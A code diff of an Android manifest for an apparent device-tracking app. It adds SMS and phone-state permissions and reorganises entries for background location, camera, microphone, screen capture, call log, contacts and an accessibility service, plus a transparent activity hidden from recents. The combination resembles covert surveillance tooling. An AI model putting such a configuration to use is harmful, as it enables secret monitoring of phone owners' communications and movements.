@@ -2,6 +2,11 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
+    <!-- =====================================================
+         HARDWARE FEATURES
+    ====================================================== -->
+
+    <!-- Camera is optional -->
     <uses-feature
         android:name="android.hardware.camera"
         android:required="false" />
@@ -10,55 +15,141 @@
         android:name="android.hardware.camera.front"
         android:required="false" />
 
-    <!-- Permissions -->
-    <uses-permission android:name="android.permission.INTERNET"/>
+    <!-- Telephony is optional.
+         Required because READ_SMS / READ_CALL_LOG are used. -->
+    <uses-feature
+        android:name="android.hardware.telephony"
+        android:required="false" />
 
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
 
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <!-- =====================================================
+         BASIC
+    ====================================================== -->
 
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission
+        android:name="android.permission.INTERNET" />
 
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
 
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" tools:targetApi="33"/>
+    <!-- =====================================================
+         LOCATION
+    ====================================================== -->
 
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+    <uses-permission
+        android:name="android.permission.ACCESS_COARSE_LOCATION" />
 
-    <!-- Camera -->
-    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission
+        android:name="android.permission.ACCESS_FINE_LOCATION" />
 
-    <!-- Microphone -->
-    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission
+        android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
-    <!-- Contacts -->
-    <uses-permission android:name="android.permission.READ_CONTACTS"/>
 
-    <!-- Audio files -->
-    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
-
-    <!-- Images / Videos (Android 13+) -->
-    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
-    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
-
-    <!-- Images / Videos (Android 12 and below) -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32"/>
-
-    <!-- For Backgroung camera & mic -->
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
-
-    <!-- For Screen -->
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
-
-    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <!-- =====================================================
+         FOREGROUND SERVICE
+    ====================================================== -->
 
     <uses-permission
         android:name="android.permission.FOREGROUND_SERVICE" />
 
     <uses-permission
+        android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+
+    <uses-permission
         android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+
+    <uses-permission
+        android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+
+    <uses-permission
+        android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+
+    <uses-permission
+        android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+
+
+    <!-- =====================================================
+         NOTIFICATIONS
+    ====================================================== -->
+
+    <uses-permission
+        android:name="android.permission.POST_NOTIFICATIONS"
+        tools:targetApi="33" />
+
+
+    <!-- =====================================================
+         CAMERA
+    ====================================================== -->
+
+    <uses-permission
+        android:name="android.permission.CAMERA" />
+
+
+    <!-- =====================================================
+         MICROPHONE
+    ====================================================== -->
+
+    <uses-permission
+        android:name="android.permission.RECORD_AUDIO" />
+
+
+    <!-- =====================================================
+         CONTACTS
+    ====================================================== -->
+
+    <uses-permission
+        android:name="android.permission.READ_CONTACTS" />
+
+
+    <!-- =====================================================
+         AUDIO FILES
+    ====================================================== -->
+
+    <uses-permission
+        android:name="android.permission.READ_MEDIA_AUDIO" />
+
+
+    <!-- =====================================================
+         IMAGES / VIDEOS - ANDROID 13+
+    ====================================================== -->
+
+    <uses-permission
+        android:name="android.permission.READ_MEDIA_IMAGES" />
+
+    <uses-permission
+        android:name="android.permission.READ_MEDIA_VIDEO" />
+
+
+    <!-- =====================================================
+         IMAGES / VIDEOS - ANDROID 12 AND BELOW
+    ====================================================== -->
+
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+
+
+    <!-- =====================================================
+         CALL HISTORY
+    ====================================================== -->
+
+    <uses-permission
+        android:name="android.permission.READ_CALL_LOG" />
+
+    <uses-permission
+        android:name="android.permission.READ_PHONE_STATE" />
+
+
+    <!-- =====================================================
+         SMS
+    ====================================================== -->
+
+    <uses-permission
+        android:name="android.permission.READ_SMS" />
+
+
+    <!-- =====================================================
+         APPLICATION
+    ====================================================== -->
 
     <application
         android:allowBackup="true"
@@ -71,44 +162,75 @@
         android:usesCleartextTraffic="true"
         android:theme="@style/Theme.DeviceTrackerApp">
 
+
+        <!-- =================================================
+             LOCATION TRACKING SERVICE
+        ================================================== -->
+
         <service
             android:name=".service.DeviceTrackingService"
-            android:foregroundServiceType="location"
-            android:exported="false"/>
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="location" />
 
-        <!-- For Backgroung camera & mic -->
+
+        <!-- =================================================
+             CAMERA + MICROPHONE SERVICE
+        ================================================== -->
+
         <service
             android:name=".service.CameraForegroundService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="camera|microphone"/>
+            android:foregroundServiceType="camera|microphone" />
+
+
+        <!-- =================================================
+             SCREEN CAPTURE SERVICE
+        ================================================== -->
 
         <service
             android:name=".service.ScreenForegroundService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="mediaProjection"/>
+            android:foregroundServiceType="mediaProjection" />
+
+
+        <!-- =================================================
+             CALL HISTORY SERVICE
+        ================================================== -->
+
+        <service
+            android:name=".service.CallHistoryForegroundService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+
+        <!-- =================================================
+             ACCESSIBILITY SERVICE
+        ================================================== -->
 
         <service
             android:name=".service.RemoteAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="false">
 
-            <service
-                android:name=".service.CallHistoryForegroundService"
-                android:enabled="true"
-                android:exported="false"
-                android:foregroundServiceType="dataSync" />
-
             <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService"/>
+                <action
+                    android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
 
             <meta-data
                 android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_config"/>
+                android:resource="@xml/accessibility_config" />
 
         </service>
+
+
+        <!-- =================================================
+             MAIN ACTIVITY
+        ================================================== -->
 
         <activity
             android:name=".MainActivity"
@@ -116,27 +238,45 @@
             android:windowSoftInputMode="adjustResize">
 
             <intent-filter>
-                <action android:name="android.intent.action.MAIN"/>
 
-                <category android:name="android.intent.category.LAUNCHER"/>
+                <action
+                    android:name="android.intent.action.MAIN" />
+
+                <category
+                    android:name="android.intent.category.LAUNCHER" />
+
             </intent-filter>
 
         </activity>
 
-<!--        <activity android:name=".activity.CameraPermissionActivity"/>-->
 
-<!--        <activity-->
-<!--            android:name=".activity.CameraActivity"-->
-<!--            android:excludeFromRecents="true"-->
-<!--            android:noHistory="true"-->
-<!--            android:theme="@style/Theme.Transparent"/>-->
+        <!-- =================================================
+             SCREEN PERMISSION ACTIVITY
+        ================================================== -->
 
         <activity
             android:name=".activity.ScreenPermissionActivity"
             android:exported="false"
             android:excludeFromRecents="true"
             android:noHistory="true"
-            android:theme="@style/Theme.Transparent"/>
+            android:theme="@style/Theme.Transparent" />
+
+
+        <!-- =================================================
+             OPTIONAL CAMERA ACTIVITIES
+        ================================================== -->
+
+        <!--
+        <activity
+            android:name=".activity.CameraPermissionActivity"
+            android:exported="false" />
+
+        <activity
+            android:name=".activity.CameraActivity"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:theme="@style/Theme.Transparent" />
+        -->
 
     </application>
 
